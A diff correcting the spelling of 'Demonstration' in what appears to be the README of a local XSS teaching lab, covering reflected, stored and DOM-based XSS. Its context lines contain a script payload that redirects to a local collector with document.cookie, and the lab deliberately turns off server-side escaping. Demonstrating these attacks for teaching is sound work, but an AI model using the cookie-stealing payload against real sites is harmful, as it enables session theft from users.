@@ -32,8 +32,8 @@ the page. If you want to clear the database, just delete the `database.db` file 
   * There must be no autoescape at the side of the server.
 
 
-# Demostrations of XSS
-## Things to note BEFORE trying the demostration
+# Demonstrations of XSS
+## Things to note BEFORE trying the Demonstration
 * Go to [127.0.0.1:5000/cookie](http://127.0.0.1:5000/cookie) to create set a cookie for the main website
 * Run `python app.py` in the malicious website folder to run the malicious server to collect the cookies
 
@@ -43,12 +43,12 @@ To delete the cookie:
 * Click on cookies
 * Right click on the entry that you want to delete
 
-## Demostration for reflected XSS
+## Demonstration for reflected XSS
 * Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the query blank
 * Notice that the code is reflected inside the addressbar as a query.
 * When the user clicks on the link containing the address, their cookies from the vulnerable website can be stolen
 
-## Demostration for Stored XSS
+## Demonstration for Stored XSS
 ### WARNING, this will spam ping the server as the page is loading
 * Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the comment blank
 * Notice that the code is stored within the website
@@ -57,7 +57,7 @@ To delete the cookie:
 As you started the flask app in development mode, any source changes should apply immediately so you can just refresh
 the page. If you want to clear the database, just delete the `database.db` file that is (re-)created on first use.
 
-## Demostration for DOM-Based XSS
+## Demonstration for DOM-Based XSS
 * Key in `http://localhost:5000/?num=alert(123)` into the address bar
 * An alert for 123 will appear as an alert
 
